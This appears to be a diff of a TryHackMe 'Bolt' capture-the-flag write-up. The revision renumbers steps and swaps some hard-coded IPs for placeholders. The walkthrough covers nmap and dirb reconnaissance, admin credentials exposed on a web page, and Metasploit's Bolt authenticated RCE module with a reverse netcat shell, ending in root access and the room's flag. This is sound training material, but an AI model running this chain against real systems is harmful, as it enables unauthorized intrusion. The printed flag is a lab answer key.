@@ -10,7 +10,7 @@ This writeup was last updated: 6/29/2023
 > Port Scanning Using Nmap
 1. Started up this room’s machine
 2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
-3. `cat {FILENAME1}.txt` to output the scan results from the previous command
+3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto the terminal
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sC -sV 10.10.195.64 > PortScan.txt
@@ -132,7 +132,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
 #
 > Scanning for Hiddent Web Directories Using Dirb
 4. `dirb http://{TARGET IP}:8000 > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
-5. `cat {FILENAME2}.txt` to output the scan results from the previous command
+5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto the terminal
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ dirb http://10.10.195.64:8000 -r > WebDirectoryScan.txt
@@ -168,55 +168,35 @@ DOWNLOADED: 4612 - FOUND: 5
 
 #
 >
-6. `firefox "http://10.10.195.64:8000"`
+6. `firefox "http://{TARGET IP}:8000"` to launch firefox and redirect it to the target's IP address to visit their homepage of their website, which we saw is located on port 8000
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ firefox "http://10.10.195.64:8000"
+└─$ firefox "http://{TARGET IP}:8000"
 ```
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/homepage.png)
 
-7. `firefox "http://10.10.195.64:8000/entries"`
+7. `firefox "http://{TARGET IP}:8000/entries"` to launch firefox and redirect it to the target's **/entries** web directory, which reveals two separate messages from the admin where one conatains their password while the other contains their username
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ firefox "http://10.10.195.64:8000/entries"
+└─$ firefox "http://{TARGET IP}:8000/entries"
 ```
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/entries.png)
 
-8. `firefox "http://10.10.195.64:8000/login.php"`
-```bash
-┌──(kali㉿kali)-[~]
-└─$ firefox "http://10.10.195.64:8000/login.php"
-```
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/entries%20pt%202.png)
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/login.php.png)
-
-9. `firefox "http://10.10.195.64:8000/pages"`
-```bash
-┌──(kali㉿kali)-[~]
-└─$ firefox "http://10.10.195.64:8000/pages"
-```
-
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/pages.png)
-
-10. `firefox "http://10.10.195.64:8000/search"`
-```bash
-┌──(kali㉿kali)-[~]
-└─$ firefox "http://10.10.195.64:8000/search"
-```
-
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/search.png)
-
-11. `https://boltcms.io`
+8. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"` to launch firefox and redirect it to Google's search results for "boltcms" to search for their official documentation, which ended up being the first link that popped up for us (**https://docs.boltcms.io**)
+  
+![]()
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms.png)
 
-12. `https://docs.boltcms.io/5.0/manual/login`
+9. `https://docs.boltcms.io/5.0/manual/login`
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms%20User%20Manual.png)
 
-13. `firefox "http://10.10.195.64:8000/bolt"` and sign in using the Jake's set of credentials that he mentioned (bolt:bolt1admin23)
+10. `firefox "http://10.10.195.64:8000/bolt"` and sign in using the Jake's set of credentials that he mentioned (bolt:bolt1admin23)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Sign%20in%20to%20Bolt.png)
 
@@ -224,9 +204,9 @@ DOWNLOADED: 4612 - FOUND: 5
 
 # Vulnerability Identification
 > Vulnerability Identification Using Metasploit
-14. `msfconsole`
-15. `search Bolt 3.7`
-16. `info {EXPLOIT PATH}`
+11. `msfconsole`
+12. `search Bolt 3.7`
+13. `info {EXPLOIT PATH}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole 
@@ -400,8 +380,8 @@ View the full module info with the info -d command.
 
 # Vulnerability Exploitation
 > Vulnerability Exploitation Using Metasploit
-17. `use {EXPLOIT PATH}`
-18. `show options`
+14. `use {EXPLOIT PATH}`
+15. `show options`
 ```bash
 msf6 > use exploit/unix/webapp/bolt_authenticated_rce
 [*] Using configured payload cmd/unix/reverse_netcat
@@ -456,13 +436,13 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
 ```
-19. `set PASSWORD {JAKE'S PASSWORD}`
-20. `set RHOSTS {TARGET IP}`
-21. `set USERNAME {JAKE'S USERNAME}`
-22. `set LHOST {MACHINE IP}`
-23. `set LPORT {PORT NUMBER}`
-24. `show options`
-25. `exploit`
+16. `set PASSWORD {JAKE'S PASSWORD}`
+17. `set RHOSTS {TARGET IP}`
+18. `set USERNAME {JAKE'S USERNAME}`
+19. `set LHOST {MACHINE IP}`
+20. `set LPORT {PORT NUMBER}`
+21. `show options`
+22. `exploit`
 ```bash
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
 PASSWORD => boltadmin123
@@ -548,9 +528,9 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
 [+] Reverted user profile back to original state.
 
 ```
-26. `whoami`
-27. `find / -type f -name flag.txt 2>/dev/null`
-28. `cat {FLAG TEXT PATH}`
+23. `whoami`
+24. `find / -type f -name flag.txt 2>/dev/null`
+25. `cat {FLAG TEXT PATH}`
 ```bash
 whoami
 root
@@ -576,27 +556,24 @@ THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 4. `cat {FILENAME2}.txt`
 5. `firefox "http://10.10.195.64:8000"`
 6. `firefox "http://10.10.195.64:8000/entries"`
-7. `firefox "http://10.10.195.64:8000/login.php"`
-8. `firefox "http://10.10.195.64:8000/pages"`
-9. `firefox "http://10.10.195.64:8000/search"`
-10. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"`
-11. `https://docs.boltcms.io/5.0/manual/login`
-12. `firefox "http://10.10.195.64:8000/bolt"`
-13. `msfconsole`
-14. `search Bolt 3.7`
-15. `info {EXPLOIT PATH}`
-16. `use {EXPLOIT PATH}`
-17. `show options`
-18. `set PASSWORD {JAKE'S PASSWORD}`
-19. `set RHOSTS {TARGET IP}`
-20. `set USERNAME {JAKE'S USERNAME}`
-21. `set LHOST {MACHINE IP}`
-22. `set LPORT {PORT NUMBER}`
-23. `show options`
-24. `exploit`
-25. `whoami`
-26. `find / -type f -name flag.txt 2>/dev/null`
-27. `cat {FLAG TEXT PATH}`
+7. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"`
+8. `https://docs.boltcms.io/5.0/manual/login`
+9. `firefox "http://10.10.195.64:8000/bolt"`
+10. `msfconsole`
+11. `search Bolt 3.7`
+12. `info {EXPLOIT PATH}`
+13. `use {EXPLOIT PATH}`
+14. `show options`
+15. `set PASSWORD {JAKE'S PASSWORD}`
+16. `set RHOSTS {TARGET IP}`
+17. `set USERNAME {JAKE'S USERNAME}`
+18. `set LHOST {MACHINE IP}`
+19. `set LPORT {PORT NUMBER}`
+20. `show options`
+21. `exploit`
+22. `whoami`
+23. `find / -type f -name flag.txt 2>/dev/null`
+24. `cat {FLAG TEXT PATH}`
 
 # Dissecting Some Commands
 `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
